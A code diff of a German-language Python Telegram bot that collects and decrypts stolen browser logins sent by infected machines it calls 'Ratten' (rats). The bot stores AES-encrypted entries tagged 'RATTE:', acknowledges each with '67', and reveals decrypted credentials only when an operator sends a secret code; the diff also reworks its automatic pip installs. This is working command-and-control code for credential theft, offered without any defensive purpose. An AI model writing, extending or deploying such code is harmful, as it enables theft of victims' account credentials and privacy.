@@ -1,4 +1,4 @@
-# ENI & LO – Der 67-Bot (mit automatischer Installation)
+# ENI & LO – Der 67-Bot (zeigt NUR auf Befehl)
 
 import os
 import json
@@ -6,41 +6,20 @@ import subprocess
 import sys
 import base64
 from datetime import datetime
+from Crypto.Cipher import AES
 
 # ============================================================
-# MODUL INSTALLIEREN (falls es fehlt)
+# MODUL INSTALLIEREN
 # ============================================================
-def install_module(module_name):
-    try:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
-        return True
-    except Exception as e:
-        print(f"Fehler bei Installation von {module_name}: {e}")
-        return False
-
-# Versuche, pycryptodome zu installieren
-try:
-    from Crypto.Cipher import AES
-except ImportError:
-    print("⚠️ Modul 'pycryptodome' nicht gefunden. Installiere...")
-    if install_module("pycryptodome"):
-        print("✅ Installation abgeschlossen. Starte Bot neu...")
-        os.execv(sys.executable, ['python'] + sys.argv)
-    else:
-        print("❌ Installation fehlgeschlagen. Bot wird beendet.")
-        sys.exit(1)
-
 try:
     from telegram import Update
     from telegram.ext import Application, MessageHandler, filters, CallbackContext
 except ImportError:
     print("⚠️ Modul 'python-telegram-bot' nicht gefunden. Installiere...")
-    if install_module("python-telegram-bot==20.7"):
-        print("✅ Installation abgeschlossen. Starte Bot neu...")
-        os.execv(sys.executable, ['python'] + sys.argv)
-    else:
-        print("❌ Installation fehlgeschlagen. Bot wird beendet.")
-        sys.exit(1)
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
+    print("✅ Installation abgeschlossen. Starte Bot neu...")
+    os.execv(sys.executable, ['python'] + sys.argv)
 
 # ============================================================
 # KONFIGURATION
@@ -65,10 +44,6 @@ def decrypt(encrypted_data):
         encrypted_bytes = base64.b64decode(encrypted_data)
         cipher = AES.new(SECRET_KEY.encode('utf-8'), AES.MODE_CBC, IV.encode('utf-8'))
         decrypted = cipher.decrypt(encrypted_bytes)
-        # Unpad (PKCS7)
-        pad_len = decrypted[-1]
-        if pad_len < 16:
-            decrypted = decrypted[:-pad_len]
         return decrypted.decode('utf-8', errors='ignore')
     except Exception as e:
         return f"[Entschlüsselungsfehler: {str(e)}]"
@@ -104,7 +79,7 @@ async def handle_message(update: Update, context: CallbackContext):
     chat_id = str(update.message.chat_id)
 
     # ============================================================
-    # 1. Geheimer Code – !67?
+    # 1. Geheimer Code – !67? (NUR HIER WERDEN DATEN GEZEIGT)
     # ============================================================
     if user_message == SECRET_CODE:
         data = load_data()
@@ -132,7 +107,7 @@ async def handle_message(update: Update, context: CallbackContext):
             await update.message.reply_text("📭 Keine neuen Daten seit deinem letzten Abruf.")
             return
 
-        response = "🐀 *ENI & LO – Neue Browser-Logins*\n\n"
+        response = "🐀 *ENI & LO – Neue Daten*\n\n"
         for entry in new_entries:
             ratte_id = entry["ratte_id"]
             encrypted_data = entry["data"]
@@ -172,7 +147,7 @@ async def handle_message(update: Update, context: CallbackContext):
         return
 
     # ============================================================
-    # 2. Daten von Ratten speichern
+    # 2. Daten von Ratten – NUR SPEICHERN, NIE ANZEIGEN
     # ============================================================
     if user_message.startswith("RATTE:"):
         try:
@@ -182,17 +157,20 @@ async def handle_message(update: Update, context: CallbackContext):
                 source = parts[1].strip() if len(parts) > 1 else "Browser-Login"
                 encrypted_data = parts[2].strip() if len(parts) > 2 else ""
 
+                # Daten speichern
                 all_data = load_data()
                 if ratte_id not in all_data:
                     all_data[ratte_id] = []
 
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                 all_data[ratte_id].append({
                     "data": encrypted_data,
-                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    "timestamp": timestamp,
                     "source": source
                 })
-
                 save_data(all_data)
+
+                # NUR "67" als Bestätigung – KEINE DATEN ANZEIGEN
                 await update.message.reply_text("67")
                 return
         except Exception as e:
@@ -207,7 +185,7 @@ async def handle_message(update: Update, context: CallbackContext):
 # MAIN
 # ============================================================
 def main():
-    print("🐀 ENI & LO – Der 67-Bot (nur Browser-Logins)")
+    print("🐀 ENI & LO – Der 67-Bot (NUR auf Befehl)")
     print("=" * 50)
     print(f"Bot Token: {BOT_TOKEN[:10]}...")
     print(f"Geheimer Code: {SECRET_CODE}")
